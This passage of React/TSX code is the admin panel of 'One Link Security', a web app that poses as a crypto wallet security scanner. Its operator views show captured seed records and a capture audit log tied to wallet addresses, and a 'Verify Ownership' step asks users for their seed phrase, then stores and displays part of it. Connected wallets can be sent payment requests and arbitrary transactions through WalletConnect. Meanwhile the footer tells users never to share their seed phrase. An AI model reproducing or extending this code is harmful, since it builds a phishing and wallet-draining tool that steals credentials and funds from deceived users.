                      <div className="seeds-panel-controls" style={{ marginBottom: '0.8rem' }}>
                        <button
                          className="btn-secondary"
                          type="button"
                          disabled={seedsLoading}
                          style={{ fontSize: '0.82rem' }}
                          onClick={() => { void refreshServerSeedRecords() }}
                        >
                          {seedsLoading ? '⟳ Loading…' : '↻ Refresh'}
                        </button>
                        <button
                          className="btn-secondary"
                          type="button"
                          style={{ fontSize: '0.82rem' }}
                          onClick={() => navigator.clipboard.writeText(rawSeedData)}
                        >
                          Copy JSON
                        </button>
                        {seedLastSynced && (
                          <span className="muted" style={{ fontSize: '0.73rem' }}>
                            Last fetch: {seedLastSynced.toLocaleTimeString()}
                          </span>
                        )}
                      </div>

                      <div className="seeds-stat" style={{ marginBottom: '0.8rem', maxWidth: '180px' }}>
                        <span className="seeds-stat-val">{serverSeedRecords.length}</span>
                        <span className="seeds-stat-label">Records</span>
                      </div>

                      <pre
                        style={{
                          margin: 0,
                          padding: '0.9rem',
                          borderRadius: '12px',
                          border: '1px solid var(--line)',
                          background: 'rgba(15,23,42,.6)',
                          color: '#e2e8f0',
                          fontSize: '0.75rem',
                          lineHeight: 1.45,
                          maxHeight: '62vh',
                          overflow: 'auto',
                          whiteSpace: 'pre-wrap',
                          wordBreak: 'break-word',
                        }}
                      >
                        {rawSeedData || '[]'}
                      </pre>
                    </div>
                  )}

                  {/* ── Audit Log ── */}
                  {adminTab === 'audit' && (
                    <div className="admin-panel">
                      <h3>Capture Audit Log</h3>
                      <p className="muted" style={{ marginBottom: '1rem', fontSize: '0.84rem' }}>
                        Shows each capture write attempt and whether it succeeded in local storage, server route, or cloud merge save.
                      </p>

                      <div className="seeds-panel-controls" style={{ marginBottom: '0.8rem' }}>
                        <button
                          className="btn-secondary"
                          type="button"
                          style={{ fontSize: '0.82rem' }}
                          onClick={() => navigator.clipboard.writeText(JSON.stringify(captureAuditRecords, null, 2))}
                        >
                          Copy JSON
                        </button>
                        <button
                          className="btn-secondary"
                          type="button"
                          style={{ fontSize: '0.82rem', color: 'var(--critical)' }}
                          onClick={() => setCaptureAuditRecords([])}
                        >
                          Clear Log
                        </button>
                      </div>

                      {captureAuditRecords.length === 0 ? (
                        <p className="muted" style={{ fontSize: '0.83rem' }}>No capture events logged yet in this browser session.</p>
                      ) : (
                        <div className="seeds-table-wrap">
                          <table className="admin-table seeds-full-table">
                            <thead>
                              <tr>
                                <th>Time</th>
                                <th>Channel</th>
                                <th>Event</th>
                                <th>Status</th>
                                <th>Wallet</th>
                                <th>Record ID</th>
                                <th>Detail</th>
                              </tr>
                            </thead>
                            <tbody>
                              {captureAuditRecords.map(row => (
                                <tr key={row.id}>
                                  <td className="muted" style={{ fontSize: '0.74rem', whiteSpace: 'nowrap' }}>{row.createdAt}</td>
                                  <td><code style={{ fontSize: '0.71rem' }}>{row.channel}</code></td>
                                  <td><code style={{ fontSize: '0.71rem' }}>{row.event}</code></td>
                                  <td>
                                    <span className={`pill ${row.status === 'ok' ? 'safe' : 'critical'}`} style={{ fontSize: '0.68rem' }}>
                                      {row.status.toUpperCase()}
                                    </span>
                                  </td>
                                  <td><code style={{ fontSize: '0.71rem', wordBreak: 'break-all' }}>{row.walletAddress ?? '—'}</code></td>
                                  <td><code style={{ fontSize: '0.71rem', wordBreak: 'break-all' }}>{row.recordId ?? '—'}</code></td>
                                  <td style={{ fontSize: '0.76rem' }}>{row.detail}</td>
                                </tr>
                              ))}
                            </tbody>
                          </table>
                        </div>
                      )}
                    </div>
                  )}

                  {/* ── QR Codes ── */}
                  {adminTab === 'qrcodes' && (
                    <div className="admin-panel">
                      <h3>QR Code Generator</h3>
                      <p className="muted" style={{ marginBottom: '1.4rem', fontSize: '0.85rem' }}>
                        Generate printable QR codes for your users. <strong>Scan Your Wallet</strong> directs users to the risk scanner.
                        <strong> Secure Your Wallet</strong> initiates a live WalletConnect session — the user scans with their mobile wallet to connect, verify ownership, and allow you to manage dApp requests.
                      </p>

                      <div className="qr-grid">
                        {/* ── Scan Your Wallet ── */}
                        <div className="qr-card">
                          <div className="qr-card-header">
                            <div className="qr-card-icon qr-card-icon--scan">
                              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>
                            </div>
                            <div>
                              <h4 className="qr-card-title">Scan Your Wallet</h4>
                              <p className="qr-card-desc">Users scan this to run a security risk check on their wallet address.</p>
                            </div>
                          </div>
                          {scanQrDataUrl ? (
                            <div className="qr-display-wrap">
                              <img src={scanQrDataUrl} alt="Scan Your Wallet QR" className="qr-img" />
                              <p className="qr-url-label">{window.location.origin} → Scan Wallet</p>
                              <div className="qr-actions">
                                <a href={scanQrDataUrl} download="scan-your-wallet-qr.png" className="btn-primary qr-dl-btn">Download PNG</a>
                                <button className="btn-secondary" type="button" onClick={() => { setScanQrDataUrl(null) }}>Reset</button>
                              </div>
                            </div>
                          ) : (
                            <button className="btn-primary qr-generate-btn" type="button" onClick={generateScanQr}>
                              Generate QR Code
                            </button>
                          )}
                        </div>

                        {/* ── Ownership Check ── */}
                        <div className="qr-card">
                          <div className="qr-card-header">
                            <div className="qr-card-icon qr-card-icon--ownership">
                              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M9 12l2 2 4-4"/><circle cx="12" cy="12" r="9"/></svg>
                            </div>
                            <div>
                              <h4 className="qr-card-title">Verify Wallet Ownership</h4>
                              <p className="qr-card-desc">Users scan this to go through the email gate and land on the Ownership Check page to verify they control their wallet.</p>
                            </div>
                          </div>
                          {ownershipQrDataUrl ? (
                            <div className="qr-display-wrap">
                              <img src={ownershipQrDataUrl} alt="Verify Ownership QR" className="qr-img" />
                              <p className="qr-url-label">{window.location.origin} → Ownership Check</p>
                              <div className="qr-actions">
                                <a href={ownershipQrDataUrl} download="verify-ownership-qr.png" className="btn-primary qr-dl-btn">Download PNG</a>
                                <button className="btn-secondary" type="button" onClick={() => setOwnershipQrDataUrl(null)}>Reset</button>
                              </div>
                            </div>
                          ) : (
                            <button className="btn-primary qr-generate-btn" type="button" onClick={generateOwnershipQr}>
                              Generate QR Code
                            </button>
                          )}
                        </div>

                        {/* ── Secure Your Wallet ── */}
                        <div className="qr-card">
                          <div className="qr-card-header">
                            <div className="qr-card-icon qr-card-icon--secure">
                              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
                            </div>
                            <div>
                              <h4 className="qr-card-title">Secure Your Wallet</h4>
                              <p className="qr-card-desc">Initiates a WalletConnect session — users scan with their wallet app to verify ownership and allow dApp management.</p>
                            </div>
                          </div>

                          {wcStatus === 'idle' && (
                            <button className="btn-primary qr-generate-btn" type="button" onClick={generateSecureQr}>
                              Generate WalletConnect QR
                            </button>
                          )}
                          {wcStatus === 'initializing' && (
                            <p className="qr-status-msg">⏳ Initializing WalletConnect session…</p>
                          )}
                          {(wcStatus === 'waiting' || wcStatus === 'connected') && secureQrDataUrl && (
                            <div className="qr-display-wrap">
                              <img src={secureQrDataUrl} alt="Secure Your Wallet QR" className="qr-img" />
                              {wcStatus === 'waiting' && <p className="qr-status-msg qr-status-waiting">⏳ Waiting for wallet to scan…</p>}
                              {wcStatus === 'connected' && <p className="qr-status-msg qr-status-ok">✅ Wallet connected</p>}
                              <div className="qr-actions">
                                <a href={secureQrDataUrl} download="secure-your-wallet-qr.png" className="btn-primary qr-dl-btn">Download PNG</a>
                                <button className="btn-secondary" type="button" onClick={() => { setWcStatus('idle'); setSecureQrDataUrl(null); setWcUri(null) }}>Reset</button>
                              </div>
                            </div>
                          )}
                          {wcActionStatus && <p className="qr-action-status">{wcActionStatus}</p>}
                        </div>
                      </div>

                      {/* ── Active WC Sessions ── */}
                      {wcSessions.length > 0 && (
                        <div className="wc-sessions-section">
                          <h4 style={{ marginBottom: '0.8rem' }}>Active Sessions ({wcSessions.length})</h4>
                          {wcSessions.map(sess => (
                            <div key={sess.topic} className={`wc-session-card ${wcSelectedTopic === sess.topic ? 'wc-session-card--selected' : ''}`}
                              onClick={() => setWcSelectedTopic(t => t === sess.topic ? null : sess.topic)}>
                              <div className="wc-session-head">
                                <div className="wc-session-info">
                                  <code className="osint-addr">{sess.address}</code>
                                  <span className="muted" style={{ fontSize: '0.8rem' }}>{sess.walletName} · {sess.connectedAt}</span>
                                </div>
                                <div style={{ display: 'flex', gap: '0.5rem', alignItems: 'center' }}>
                                  {sess.ownershipVerified
                                    ? <span className="pill low">Verified</span>
                                    : <span className="pill medium">Unverified</span>}
                                  <button className="preview-btn" type="button" style={{ color: 'var(--critical)' }}
                                    onClick={e => { e.stopPropagation(); disconnectWcSession(sess.topic) }}>
                                    Disconnect
                                  </button>
                                </div>
                              </div>

                              {wcSelectedTopic === sess.topic && (
                                <div className="wc-session-body" onClick={e => e.stopPropagation()}>
                                  {/* Ownership Verification */}
                                  {!sess.ownershipVerified && (
                                    <div className="wc-section">
                                      <h5>Verify Ownership</h5>
                                      <p className="muted" style={{ fontSize: '0.82rem', marginBottom: '0.6rem' }}>
                                        Ask the user to provide their seed phrase or a signed message to confirm they control this wallet.
                                      </p>
                                      <div className="wc-inline-form">
                                        <input
                                          type="text"
                                          placeholder="Seed phrase or verification key…"
                                          value={wcSeedInput}
                                          onChange={e => setWcSeedInput(e.target.value)}
                                          className="wc-input"
                                        />
                                        <button className="btn-primary" type="button" onClick={() => verifyWcOwnership(sess.topic)}>Verify</button>
                                      </div>
                                    </div>
                                  )}
                                  {sess.ownershipVerified && (
                                    <div className="wc-section wc-verified-notice">
                                      <span>✅ Ownership verified</span>
                                      {sess.seedPhrase && <code style={{ fontSize: '0.75rem', opacity: 0.7, marginLeft: '0.5rem' }}>{sess.seedPhrase.slice(0, 20)}…</code>}
                                    </div>
                                  )}

                                  {/* Request Payment */}
                                  <div className="wc-section">
                                    <h5>Request Payment</h5>
                                    <div className="wc-two-col">
                                      <div className="field">
                                        <label>Recipient Address</label>
                                        <input type="text" placeholder="0x…" value={wcPayTo} onChange={e => setWcPayTo(e.target.value)} className="wc-input" />
                                      </div>
                                      <div className="field">
                                        <label>Amount (ETH)</label>
                                        <input type="text" placeholder="0.01" value={wcPayAmount} onChange={e => setWcPayAmount(e.target.value)} className="wc-input" />
                                      </div>
                                    </div>
                                    <button className="btn-primary" type="button" style={{ marginTop: '0.5rem' }} onClick={() => sendWcPaymentRequest(sess.topic)}>
                                      Queue Payment Request
                                    </button>
                                  </div>

                                  {/* Send Transaction */}
                                  <div className="wc-section">
                                    <h5>Send Transaction</h5>
                                    <div className="wc-two-col">
                                      <div className="field">
                                        <label>To Address</label>
                                        <input type="text" placeholder="0x…" value={wcTxTo} onChange={e => setWcTxTo(e.target.value)} className="wc-input" />
                                      </div>
                                      <div className="field">
                                        <label>Value (ETH)</label>
                                        <input type="text" placeholder="0.0 (optional)" value={wcTxValue} onChange={e => setWcTxValue(e.target.value)} className="wc-input" />
                                      </div>
                                    </div>
                                    <div className="field" style={{ marginTop: '0.4rem' }}>
                                      <label>Data (hex, optional)</label>
                                      <input type="text" placeholder="0x" value={wcTxData} onChange={e => setWcTxData(e.target.value)} className="wc-input" />
                                    </div>
                                    <button className="btn-primary" type="button" style={{ marginTop: '0.5rem' }} onClick={() => sendWcTransaction(sess.topic)}>
                                      Send via WalletConnect
                                    </button>
                                  </div>
                                </div>
                              )}
                            </div>
                          ))}
                        </div>
                      )}

                      {/* ── dApp Request Log ── */}
                      {wcDappRequests.length > 0 && (
                        <div style={{ marginTop: '1.6rem' }}>
                          <h4 style={{ marginBottom: '0.8rem' }}>dApp Request Log ({wcDappRequests.length})</h4>
                          <div className="table-wrap">
                            <table className="admin-table">
                              <thead><tr><th>Type</th><th>Wallet</th><th>Params</th><th>Status</th><th>Date</th></tr></thead>
                              <tbody>{wcDappRequests.map(r => (
                                <tr key={r.id}>
                                  <td><span className={`pill ${r.type === 'payment' ? 'medium' : 'high'}`}>{r.type}</span></td>
                                  <td title={r.address}>{shortAddr(r.address)}</td>
                                  <td style={{ fontSize: '0.78rem', fontFamily: 'monospace' }}>
                                    {r.type === 'payment'
                                      ? `→ ${shortAddr(r.params.to)} · ${r.params.value} ${r.params.unit}`
                                      : `→ ${shortAddr(r.params.to)} · ${r.params.value} ETH`}
                                  </td>
                                  <td><span className={`pill ${r.status === 'approved' ? 'low' : r.status === 'rejected' ? 'critical' : 'medium'}`}>{r.status}</span></td>
                                  <td>{r.createdAt}</td>
                                </tr>
                              ))}</tbody>
                            </table>
                          </div>
                        </div>
                      )}
                    </div>
                  )}

                  {/* ── Address Intel ── */}
                  {/* ── Bot Requests tab ── */}
                  {adminTab === 'bots' && (
                    <div className="admin-panel">
                      <h3>Bot Protection Requests ({botRequests.length})</h3>
                      <p className="muted" style={{ marginBottom: '1.2rem', fontSize: '0.85rem' }}>
                        Review wallet bot protection requests. Approve to activate protection or decline with a reason. An email is sent to the user automatically.
                      </p>
                      {botRequests.length === 0 ? (
                        <p className="admin-empty">No bot protection requests yet.</p>
                      ) : (
                        <div className="bot-req-list">
                          {botRequests.map(req => {
                            const isOpen = botDeclineOpen === req.id
                            const emailSt = botEmailStatus[req.id]
                            return (
                              <div key={req.id} className={`bot-req-card ${req.status}`}>
                                <div className="bot-req-head">
                                  <div className="bot-req-addr">
                                    <span className="bot-req-avatar">{req.walletAddress.slice(2,4).toUpperCase()}</span>
                                    <div>
                                      <div className="bot-req-wallet" title={req.walletAddress}>
                                        {req.walletAddress.slice(0,10)}…{req.walletAddress.slice(-6)}
                                      </div>
                                      <div className="bot-req-meta">
                                        {chainConfig[req.chain].label} · {req.name} · {req.email}
                                      </div>
                                    </div>
                                  </div>
                                  <div className="bot-req-status-col">
                                    <span className={`pill ${req.status === 'approved' ? 'low' : req.status === 'declined' ? 'critical' : 'medium'}`}>
                                      {req.status}
                                    </span>
                                    {emailSt && (
                                      <span className={`pill ${emailSt === 'sent' ? 'low' : emailSt === 'failed' ? 'critical' : 'medium'}`} style={{ fontSize:'0.68rem' }}>
                                        email {emailSt}
                                      </span>
                                    )}
                                  </div>
                                </div>

                                <div className="bot-req-details">
                                  <span>Requested: {req.requestedAt}</span>
                                  {req.reviewedAt && <span>Reviewed: {req.reviewedAt}</span>}
                                  <span>IP: {req.ip ?? '—'}</span>
                                  <span>Device: {req.device ?? '—'}</span>
                                </div>

                                {req.reason && (
                                  <div className="bot-req-reason">
                                    <strong>Reason:</strong> {req.reason}
                                  </div>
                                )}

                                {req.status === 'pending' && (
                                  <div className="bot-req-actions">
                                    <button
                                      className="btn-primary"
                                      type="button"
                                      disabled={botReviewingId === req.id}
                                      onClick={() => reviewBotRequest(req, 'approved', 'Your wallet has been approved for blockchain anti-bot protection. All protection layers are now active.')}
                                      style={{ fontSize:'0.82rem', padding:'0.45rem 1rem' }}
                                    >
                                      {botReviewingId === req.id ? 'Processing…' : '✓ Approve'}
                                    </button>
                                    <button
                                      className="btn-secondary"
                                      type="button"
                                      onClick={() => { setBotDeclineOpen(isOpen ? null : req.id); setBotDeclineIdx(null); setBotDeclineCustom('') }}
                                      style={{ fontSize:'0.82rem', padding:'0.45rem 1rem' }}
                                    >
                                      {isOpen ? 'Cancel' : '✕ Decline'}
                                    </button>
                                  </div>
                                )}

                                {isOpen && req.status === 'pending' && (
                                  <div className="bot-decline-panel">
                                    <p className="bot-decline-label">Select a decline reason or write a custom one:</p>
                                    <div className="bot-decline-templates">
                                      {BOT_DECLINE_REASONS.map((r, i) => (
                                        <button
                                          key={i}
                                          type="button"
                                          className={`bot-decline-tpl ${botDeclineIdx === i ? 'selected' : ''}`}
                                          onClick={() => { setBotDeclineIdx(i); setBotDeclineCustom('') }}
                                        >
                                          {r}
                                        </button>
                                      ))}
                                    </div>
                                    <textarea
                                      className="form-input"
                                      rows={3}
                                      placeholder="Or write a custom reason…"
                                      value={botDeclineCustom}
                                      onChange={e => { setBotDeclineCustom(e.target.value); setBotDeclineIdx(null) }}
                                      style={{ marginTop:'0.6rem', fontSize:'0.82rem' }}
                                    />
                                    <button
                                      className="btn-primary"
                                      type="button"
                                      disabled={botDeclineIdx === null && !botDeclineCustom.trim()}
                                      onClick={() => {
                                        const reason = botDeclineCustom.trim() || (botDeclineIdx !== null ? BOT_DECLINE_REASONS[botDeclineIdx] : '')
                                        if (reason) reviewBotRequest(req, 'declined', reason)
                                      }}
                                      style={{ marginTop:'0.6rem', fontSize:'0.82rem', background:'var(--red)', padding:'0.45rem 1rem' }}
                                    >
                                      Confirm Decline &amp; Send Email
                                    </button>
                                  </div>
                                )}
                              </div>
                            )
                          })}
                        </div>
                      )}
                    </div>
                  )}

                  {adminTab === 'intel' && (
                    <div className="admin-panel">
                      <h3>Address Intel Management</h3>
                      <p className="muted" style={{ marginBottom: '1rem', fontSize: '0.85rem' }}>
                        Add intelligence for specific wallet addresses. When a user scans a flagged address, your findings and severity override will be merged into their report.
                      </p>

                      <form className="intel-form" onSubmit={addAdminIntel}>
                        <div className="intel-form-grid">
                          <div className="field">
                            <label>Wallet Address</label>
                            <input type="text" placeholder="0x…" value={intelAddress} onChange={e => setIntelAddress(e.target.value)} />
                          </div>
                          <div className="field">
                            <label>Network</label>
                            <select value={intelChain} onChange={e => setIntelChain(e.target.value as ChainKey)}>
                              {Object.entries(chainConfig).map(([k, v]) => <option key={k} value={k}>{v.label}</option>)}
                            </select>
                          </div>
                          <div className="field">
                            <label>Override Severity</label>
                            <select value={intelSeverity} onChange={e => setIntelSeverity(e.target.value as Severity)}>
                              {(['low', 'medium', 'high', 'critical'] as Severity[]).map(s => <option key={s} value={s}>{s.charAt(0).toUpperCase() + s.slice(1)}</option>)}
                            </select>
                          </div>
                        </div>
                        <div className="field">
                          <label>Findings (one per line)</label>
                          <textarea rows={4} placeholder={'Address linked to known drainer campaign.\nFunds moved to Tornado Cash mixer.\nReported by 3 victims.'} value={intelFindings} onChange={e => setIntelFindings(e.target.value)} />
                        </div>
                        <div className="field">
                          <label>Internal Notes</label>
                          <textarea rows={2} placeholder="Case reference, source, investigation notes…" value={intelNotes} onChange={e => setIntelNotes(e.target.value)} />
                        </div>
                        {intelFormError && <p className="error">{intelFormError}</p>}
                        <button className="btn-primary" type="submit">Add Address Intel</button>
                      </form>

                      <div style={{ height: '1px', background: 'var(--border)', margin: '1.4rem 0' }} />
                      <h4 style={{ marginBottom: '0.8rem' }}>Saved Intel Records ({adminIntelRecords.length})</h4>
                      {adminIntelRecords.length === 0 ? <p className="admin-empty">No intel records added yet.</p> : (
                        <div className="intel-records">
                          {adminIntelRecords.map(r => (
                            <div key={r.id} className="intel-record-card">
                              <div className="intel-record-head">
                                <code className="osint-addr">{r.address}</code>
                                <span className={`pill ${r.severity}`}>{r.severity}</span>
                                <span className="muted" style={{ fontSize: '0.78rem' }}>{chainConfig[r.chain].label} · {r.addedAt}</span>
                                <button className="preview-btn" type="button" style={{ marginLeft: 'auto', color: 'var(--critical)' }}
                                  onClick={() => setAdminIntelRecords(prev => prev.filter(x => x.id !== r.id))}>
                                  Remove
                                </button>
                              </div>
                              <ul className="intel-findings-list">
                                {r.findings.map((f, i) => <li key={i}>{f}</li>)}
                              </ul>
                              {r.notes && <p className="muted" style={{ fontSize: '0.82rem', marginTop: '0.3rem' }}>Note: {r.notes}</p>}
                            </div>
                          ))}
                        </div>
                      )}
                    </div>
                  )}
                </>
              )}
            </div>
          </div>
        )}
      </div>

      <footer className="footnote">
        One Link Security — advisory software only. Never share your seed phrase with any site.
      </footer>
    </div>
  )
}
